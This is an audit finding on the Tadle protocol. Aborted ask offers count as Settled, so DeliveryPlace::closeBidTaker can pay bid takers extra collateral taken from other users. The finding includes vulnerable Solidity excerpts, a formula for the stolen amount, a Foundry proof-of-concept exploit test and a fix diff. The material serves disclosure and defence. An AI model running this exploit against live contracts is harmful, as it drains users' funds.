---
tags:
  - lang/move
  - lang/solidity
  - sector/lending
  - sector/nft
  - sector/stable
  - platform/codehawks
  - severity/high
  - impact/loss-of-funds/direct-drain
protocol: "[[Tadle]]"
auditors:
  - "[[eeyore]]"
genome:
  - "[[wrong-condition]]"
  - "[[direct-drain]]"
  - "[[integer-bounds]]"
---
# Missing abort status check allows bid taker to steal users funds

- id: 38089
- impact: HIGH
- protocol: [[Tadle]]
- reporter: eeyore (Codehawks)
- source: N/A

## Summary


This bug report discusses a high-risk issue where a bid taker can steal funds from users. The problem occurs when an ask maker aborts their offer, which changes the status to "Settled." This allows bid takers to close the bid offers without proper checks, resulting in the collateral being taken from another user. The vulnerability details show that the bid taker can steal the amount above the offer amount, which includes the original deposit and an additional fee. This can be seen in the provided proof of concept. The report recommends checking the abort status of the offer in the function "DeliveryPlace::closeBidTaker" to prevent this issue.

## Details

## Summary
When the ask makers abort offers their status is changed to `Settled` in function `PreMarkets::abortAskOffer`:

```javascript
offerInfo.abortOfferStatus = AbortOfferStatus.Aborted;
offerInfo.offerStatus = OfferStatus.Settled;
```
Therefore bid takers can close the bid offers by calling `DeliveryPlace::closeBidTaker` since the only offer status check is the following:

```javascript
if (offerInfo.offerStatus != OfferStatus.Settled) {
    revert InvalidOfferStatus();
}
```

If the ask maker has not settled the offer, the collateral corresponding to the points purchased by the bid taker will be sent as a penalty. However, since the collateral has already been returned (except for the portion representing the profit from the sale that belongs to the bid taker), the additional amount sent to the bid taker will be taken from another user.

```javascript
        uint256 collateralFee;
        if (offerInfo.usedPoints > offerInfo.settledPoints) {
            if (offerInfo.offerStatus == OfferStatus.Virgin) {
                collateralFee = OfferLibraries.getDepositAmount(
                    offerInfo.offerType,
                    offerInfo.collateralRate,
                    offerInfo.amount,
                    true,
                    Math.Rounding.Floor
                );
            } else {
                uint256 usedAmount = offerInfo.amount.mulDiv(
                    offerInfo.usedPoints,
                    offerInfo.points,
                    Math.Rounding.Floor
                );
                collateralFee = OfferLibraries.getDepositAmount(
                    offerInfo.offerType,
                    offerInfo.collateralRate,
                    usedAmount,
                    true,
                    Math.Rounding.Floor
                );
            }
        }

        uint256 userCollateralFee = collateralFee.mulDiv(
            userRemainingPoints,
            offerInfo.usedPoints,
            Math.Rounding.Floor
        );

        tokenManager.addTokenBalance(
            TokenBalanceType.RemainingCash,
            _msgSender(),
            makerInfo.tokenAddress,
            userCollateralFee
        );
```

This collateral fee includes the original amount the bid taker provided, plus an additional fee calculated based on the collateral rate set by the ask maker. This amount would be paid twice but deposited only once.
## Vulnerability Details
Bid takers would be stealing the amount above the offer amount corresponding to the points bought, i.e., the additional collateral ratio set by the offer maker, since their oiriginal deposit had a unit collateral rate:

$$\text{stolen amount} = \frac{(\text{collateralRate}-1) \cdot \text{userRemainingPoints} \cdot \text{offerInfo.amount}}{\text{offerInfo.usedPoints}}$$

## Impact
Refer to PoC for an example:

```javascript
    function test_bid_taker_closes_aborted_offer() public {
        vm.startPrank(user);

        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                0.01 * 1e18,
                12000,
                300,
                OfferType.Ask,
                OfferSettleType.Turbo
            )
        );
        vm.stopPrank();

        vm.startPrank(user1);
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);
        address stockAddr = GenerateAddress.generateStockAddress(0);
        address offerAddr = GenerateAddress.generateOfferAddress(0);

        preMarktes.createTaker(offerAddr, 500);
        vm.stopPrank();

        vm.prank(user);
        preMarktes.abortAskOffer(stockAddr, offerAddr);

        address stock1Addr = GenerateAddress.generateStockAddress(1);

        vm.prank(user1);
        // closes aborted offer before settlement period and gets additional 0.2*0.005*1e18 USDC
        deliveryPlace.closeBidTaker(stock1Addr);
        assertEq(
            tokenManager.userTokenBalanceMap(
                user1,
                address(mockUSDCToken),
                TokenBalanceType.RemainingCash
            ),
            (((0.01 * 1e18) / 2) * 12000) / 10000
        );
    }
```
## Tools Used
Manual review.

## Recommendations
Check the abort status of the offer the taker is trying to close in `DeliveryPlace::closeBidTaker`:

```diff
...
        if (makerInfo.offerSettleType == OfferSettleType.Protected) {
            offerInfo = preOfferInfo;
            userRemainingPoints = stockInfo.points;
        } else {
            offerInfo = perMarkets.getOfferInfo(makerInfo.originOffer);
            if (stockInfo.offer == address(0x0)) {
                userRemainingPoints = stockInfo.points;
            } else {
                OfferInfo memory listOfferInfo = perMarkets.getOfferInfo(
                    stockInfo.offer
                );
                userRemainingPoints =
                    listOfferInfo.points -
                    listOfferInfo.usedPoints;
            }
        }
+       if (offerInfo.abortOfferStatus == AbortOfferStatus.Aborted) {
+           revert("Pre offer aborted");
+       }
...
```
